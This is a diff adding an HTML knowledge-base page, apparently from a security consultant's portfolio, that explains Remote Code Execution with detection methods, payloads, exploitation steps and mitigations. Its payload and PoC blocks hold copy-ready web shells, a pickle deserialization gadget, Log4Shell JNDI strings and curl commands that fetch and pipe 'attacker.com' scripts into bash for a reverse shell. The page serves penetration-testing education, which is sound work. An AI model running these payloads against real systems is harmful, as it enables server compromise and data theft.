@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Remote Code Execution (RCE) | Web Security | Saikumar Raju</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
+    body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
+    body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; transition: all 0.3s ease; }
+    .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
+    .navbar { position: sticky; top: 0; background: var(--bg-dark); border-bottom: 1px solid var(--border); padding: 1rem 0; z-index: 100; backdrop-filter: blur(8px); }
+    .nav-flex { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+    .logo { font-size: 1.5rem; font-weight: 700; text-decoration: none; color: var(--text-primary); }
+    .logo span { color: var(--primary); }
+    .nav-links { display: flex; gap: 2rem; list-style: none; align-items: center; flex-wrap: wrap; }
+    .nav-links a { text-decoration: none; color: var(--text-secondary); font-weight: 500; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--primary); }
+    .theme-toggle { background: var(--bg-elevated); border: none; padding: 0.4rem 1rem; border-radius: 40px; cursor: pointer; color: var(--text-primary); display: flex; align-items: center; gap: 0.5rem; font-family: inherit; }
+    .mobile-menu { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
+    .page-header { padding: 6rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .page-header h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; }
+    .severity-badge { display: inline-block; background: rgba(255, 68, 68, 0.2); color: #ff4444; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
+    .content-section h3 { font-size: 1.2rem; margin: 1rem 0 0.5rem; }
+    .content-section p { margin-bottom: 1rem; color: var(--text-secondary); }
+    .content-section ul, .content-section ol { margin: 1rem 0 1.5rem 2rem; color: var(--text-secondary); }
+    .content-section li { margin-bottom: 0.5rem; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
+    .copy-btn:hover { color: var(--primary); }
+    .vulnerability-box { background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
+    .test-cases { width: 100%; border-collapse: collapse; background: var(--bg-card); border: 1px solid var(--border); margin: 1rem 0; }
+    .test-cases th, .test-cases td { padding: 0.75rem; text-align: left; border-bottom: 1px solid var(--border); }
+    .test-cases th { background: var(--bg-elevated); color: var(--primary); }
+    @media (max-width: 768px) {
+      .container { padding: 0 1rem; }
+      .mobile-menu { display: block; }
+      .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; }
+      .nav-links.show { display: flex; }
+      .page-header h1 { font-size: 1.8rem; }
+    }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar.<span>Raju</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Resume</a></li>
+      <li><a href="../knowledge-base.html">Knowledge Base</a></li>
+      <li><a href="../blog.html">Write-ups</a></li>
+      <li><a href="../tools.html">Tools</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> Dark</button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / Remote Code Execution (RCE)</div>
+    <div class="page-header">
+      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Critical Severity</span>
+      <h1>📌 Remote Code Execution (RCE)</h1>
+    </div>
+
+    <div class="content-section">
+      <h2>🧠 Description</h2>
+      <p><strong>What is RCE?</strong></p>
+      <p>Remote Code Execution allows an attacker to execute arbitrary code on the target server. This is often the most severe vulnerability, leading to full system compromise, data theft, ransomware, or lateral movement.</p>
+      <p><strong>Why does it occur?</strong></p>
+      <ul>
+        <li>Unsafe deserialization of user input</li>
+        <li>Command injection via system calls</li>
+        <li>Vulnerable libraries or frameworks (Log4Shell, Spring4Shell, etc.)</li>
+        <li>File upload leading to webshell</li>
+        <li>Template injection (SSTI) that allows code execution</li>
+      </ul>
+      <p><strong>Security principle violated:</strong> Input Validation, Secure Configuration, Least Privilege</p>
+    </div>
+
+    <div class="content-section">
+      <h2>🏷️ Classification</h2>
+      <ul>
+        <li><strong>Type:</strong> Remote Code Execution</li>
+        <li><strong>OWASP:</strong> A03:2021 – Injection (when via injection) / A08:2021 – Software and Data Integrity Failures (when via deserialization)</li>
+        <li><strong>CWE:</strong> CWE-94, CWE-502, CWE-78, CWE-74</li>
+      </ul>
+    </div>
+
+    <div class="content-section">
+      <h2>🎯 Attack Surface</h2>
+      <ul>
+        <li>✅ Deserialization endpoints (Java, PHP, Python, .NET)</li>
+        <li>✅ System command execution features (ping, traceroute, convert)</li>
+        <li>✅ File upload (webshell)</li>
+        <li>✅ Template engines (SSTI)</li>
+        <li>✅ Expression language injection (EL, OGNL, SpEL)</li>
+        <li>✅ Vulnerable third‑party libraries (e.g., Log4j, Fastjson, XStream)</li>
+      </ul>
+    </div>
+
+    <div class="content-section">
+      <h2>🔍 Detection Methodology</h2>
+      <h3>1. Static Analysis</h3>
+      <ul>
+        <li>Search for dangerous functions: <code>eval()</code>, <code>exec()</code>, <code>Runtime.exec()</code>, <code>ProcessBuilder</code>, <code>unserialize()</code>, <code>pickle.loads()</code>, <code>yaml.load()</code> (unsafe)</li>
+        <li>Check for deserialization of user input without type whitelisting</li>
+      </ul>
+      <h3>2. Dynamic Analysis</h3>
+      <ul>
+        <li>Inject sleep payloads (<code>sleep(5)</code>, <code>ping -c 5 attacker.com</code>) to detect command injection</li>
+        <li>Send malicious serialized objects (e.g., ysoserial payloads) to deserialization endpoints</li>
+        <li>Upload webshell and try to access it</li>
+      </ul>
+      <p><strong>Tools:</strong> ysoserial, Burp Suite, custom scripts, nuclei templates</p>
+    </div>
+
+    <div class="content-section">
+      <h2>💣 Basic Payloads</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Command injection style
+; ping -c 5 attacker.com
+| curl http://attacker.com/revshell.sh | bash
+`id`
+
+# PHP eval
+<?php system($_GET['cmd']); ?>
+
+# JSP
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+
+# Python pickle (deserialization)
+import pickle, os, base64
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('id',))
+print(base64.b64encode(pickle.dumps(RCE())))</pre>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>🚀 Advanced Payloads / Bypass</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Log4Shell (CVE-2021-44228)
+${jndi:ldap://attacker.com/exploit}
+
+# Spring4Shell (CVE-2022-22965)
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{5}i&suffix=.jsp
+
+# ysoserial (Java deserialization)
+java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/rev' | base64
+
+# PHP‑GGC (PHP deserialization)
+phpggc Monolog/RCE1 system 'id' --json</pre>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>🧪 Test Cases (STRICT)</h2>
+      <table class="test-cases">
+        <thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead>
+        <tbody>
+          <tr><td style="padding: 0.75rem;">1</td><td style="padding: 0.75rem;">Inject <code>; sleep 5</code> in parameter</td><td style="padding: 0.75rem;">5‑second delay</td><td style="padding: 0.75rem;">Time‑based RCE confirmed</td></tr>
+          <tr><td style="padding: 0.75rem;">2</td><td style="padding: 0.75rem;">Send malicious serialized object</td><td style="padding: 0.75rem;">Command executed or error</td><td style="padding: 0.75rem;">Deserialization RCE</td></tr>
+          <tr><td style="padding: 0.75rem;">3</td><td style="padding: 0.75rem;">Upload webshell.php and access</td><td style="padding: 0.75rem;">Remote command output</td><td style="padding: 0.75rem;">File upload RCE</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="content-section">
+      <h2>⚙️ Exploitation Steps</h2>
+      <ol>
+        <li>Identify injection point (deserialization, command, upload, template).</li>
+        <li>Test with harmless delay payload (e.g., <code>sleep 5</code>).</li>
+        <li>If delay works, attempt to read a file (<code>cat /etc/passwd</code>).</li>
+        <li>Establish a reverse shell for interactive access.</li>
+        <li>Escalate privileges on the compromised host.</li>
+      </ol>
+    </div>
+
+    <div class="content-section">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box">
+        <strong>✅ Avoid deserialization of untrusted data; use allowlists</strong><br>
+        <strong>✅ Never use system() or exec() with user input; use safe APIs</strong><br>
+        <strong>✅ Keep frameworks and libraries updated (patch known RCEs)</strong><br>
+        <strong>✅ Run applications with least privilege</strong><br>
+        <strong>✅ Use WAF with virtual patching for known RCE exploits</strong><br>
+        <strong>✅ Implement input validation and output encoding</strong>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>⚠️ Risk / Impact</h2>
+      <div class="vulnerability-box">
+        <strong>Severity: Critical</strong><br><br>
+        <strong>Impact:</strong> Full server compromise, data breach, ransomware, lateral movement, persistence.
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>📎 Proof of Concept (PoC)</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Command injection based RCE
+curl "https://target.com/ping?ip=127.0.0.1; curl https://attacker.com/rev.sh | bash"
+
+# Deserialization RCE (Java)
+curl -X POST https://target.com/deserialize -H "Content-Type: application/json" -d '{"data":"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ..."}'
+
+# Log4Shell RCE
+curl -H "User-Agent: ${jndi:ldap://attacker.com/a}" https://target.com/search</pre>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://portswigger.net/web-security/deserialization" class="reference-link" target="_blank">PortSwigger – Insecure Deserialization</a></li>
+        <li><a href="https://github.com/frohoff/ysoserial" class="reference-link" target="_blank">ysoserial – Java deserialization payloads</a></li>
+        <li><a href="https://www.lunasec.io/docs/blog/log4j-zero-day/" class="reference-link" target="_blank">Log4Shell deep dive</a></li>
+        <li><a href="https://book.hacktricks.xyz/pentesting-web/deserialization" class="reference-link" target="_blank">HackTricks – Deserialization</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
+  </div>
+</main>
+
+<footer><p>Saikumar Raju — Cybersecurity Consultant | Remote Code Execution Guide</p></footer>
+
+<script>
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle'); if (themeToggle) { themeToggle.addEventListener('click', () => { document.body.classList.toggle('light'); const icon = themeToggle.querySelector('i'); if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light'; } else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark'; } }); }
+  function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
